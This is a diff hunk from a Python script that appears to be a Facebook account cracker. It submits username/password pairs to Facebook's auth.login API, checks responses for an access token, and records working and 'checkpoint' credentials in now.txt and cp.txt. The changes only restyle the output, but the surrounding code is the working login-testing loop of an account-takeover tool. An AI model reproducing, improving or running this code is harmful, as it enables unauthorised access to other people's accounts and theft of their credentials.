@@ -220,23 +220,23 @@ def mbfv2():
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
-                 print(f"\r\033[1;92m  * 👉 {username}[▪]{password}                       ",end="")
+                 print(f"\r\033[1;92m  * \033[90m[\033[92mNOW\033[90m]👉\033[92m {username}[-]{password}                       ",end="")
                  print()
                  result += 1
                  if cek:
-                        life.append(username+"[▪]"+password)
+                        life.append(username+"[-]"+password)
                  else:
                         with open('now.txt','a') as f:
-                                f.write(username + '[▪]' + password + '\n')
+                                f.write(username + '[-]' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
-                   print(f"\r\033[1;93m  * 👉 {username}[▪]{password}                    ",end="")
+                   print(f"\r\033[1;93m  * \033[90m[\033[93mcheckpoint\033[90m]👉\033[93m {username}\033[90m[\033[93m+\033[90m]\033[93m{password}                    ",end="")
                    print()
                    check += 1
                    if cek:
-                           chek.append(username+"[▪]"+password)
+                           chek.append(username+"[+]"+password)
                    else:
                            with open('cp.txt','a') as f:
-                                f.write(username + '[▪]' + password + '\n')
+                                f.write(username + '[+]' + password + '\n')
              else:
                    die += 1
              for i in list('♧◇♡♤'):
